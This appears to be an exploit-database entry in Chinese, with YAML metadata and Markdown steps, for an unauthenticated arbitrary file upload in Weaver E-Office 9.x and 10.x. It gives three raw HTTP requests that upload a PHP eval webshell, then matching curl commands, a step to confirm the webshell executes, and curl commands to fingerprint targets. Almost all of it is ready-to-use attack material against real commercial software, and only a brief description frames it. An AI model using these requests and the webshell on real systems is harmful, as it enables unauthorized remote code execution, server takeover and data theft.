---
id: WEAVER-EOFFICE-UPLOAD-RCE
title: 泛微 E-Office 多路径任意文件上传
product: weaver-oa
vendor: 泛微网络
version_affected: "E-Office 9.x, 10.x"
severity: CRITICAL
tags: [rce, file_upload, 无需认证, 国产, oa]
fingerprint: ["泛微", "E-Office", "OfficeServer.php", "UploadFile.php", "uploadify"]
---

## 漏洞描述

泛微 E-Office 多个文件上传接口缺少认证和文件类型校验，可直接上传 PHP webshell。

## 影响版本

- E-Office 9.x
- E-Office 10.x

## 前置条件

- 无需认证
- 目标为泛微 E-Office 9.x/10.x，上传接口可访问

## 利用步骤

### 路径一：OfficeServer.php

```http
POST /general/OfficeServer.php HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: application/octet-stream

<?php @eval($_POST['cmd']);?>
------WebKitFormBoundary--
```

### 路径二：UploadFile.php

```http
POST /E-mobile/App/Ajax/UploadFile.php HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: application/octet-stream

<?php @eval($_POST['cmd']);?>
------WebKitFormBoundary--
```

### 路径三：uploadify

```http
POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="Filedata"; filename="test.php"
Content-Type: application/octet-stream

<?php @eval($_POST['cmd']);?>
------WebKitFormBoundary--
```

## Payload

```bash
# 路径一：OfficeServer.php
curl -X POST "http://target/general/OfficeServer.php" \
  -F "file=@test.php;type=application/octet-stream"

# 路径二：UploadFile.php
curl -X POST "http://target/E-mobile/App/Ajax/UploadFile.php" \
  -F "file=@test.php;type=application/octet-stream"

# 路径三：uploadify
curl -X POST "http://target/inc/jquery/uploadify/uploadify.php" \
  -F "Filedata=@test.php;type=application/octet-stream"
```

## 验证方法

上传后访问对应路径确认 webshell 执行。

## 指纹确认

```bash
curl -s http://target/ | grep -i "E-Office\|泛微"
curl -s -o /dev/null -w "%{http_code}" http://target/general/OfficeServer.php
```
